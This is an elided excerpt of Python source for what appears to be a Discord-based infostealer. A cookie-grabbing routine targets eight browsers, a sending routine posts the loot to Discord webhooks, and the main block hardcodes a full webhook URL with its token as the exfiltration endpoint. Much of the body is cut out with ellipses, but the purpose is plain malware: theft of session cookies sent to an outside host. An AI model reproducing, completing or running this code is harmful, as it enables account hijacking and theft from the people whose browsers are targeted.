...
def cookies_grabber_mod(u):
    cookies = []
    browsers = ["chrome", "edge", "firefox", "brave", "opera", "vivaldi", "chromium", "opera_gx"]
...
def send_webhook(DISCORD_WEBHOOK_URLs):
    ...
    with TemporaryDirectory(dir=".") as td:
        ...
        for URL in DISCORD_WEBHOOK_URLs:
            ...
            embed.set_footer(text="By Lemon.-_-.#3714 & 0xSpoofed & Itayos")
            embed.set_timestamp()
...
if __name__ == "__main__":
    freeze_support()
    if len(sys.argv) == 1:
        send_webhook(["https://discord.com/api/webhooks/1096032872109977660/PJ4iNpU_bsKHx4bmPUNCdYRD3yLys3qbwWW2UyKMtvzbnzLc-7V-f3HX_dY08F_UTog6"])
    else:
        del sys.argv[0]
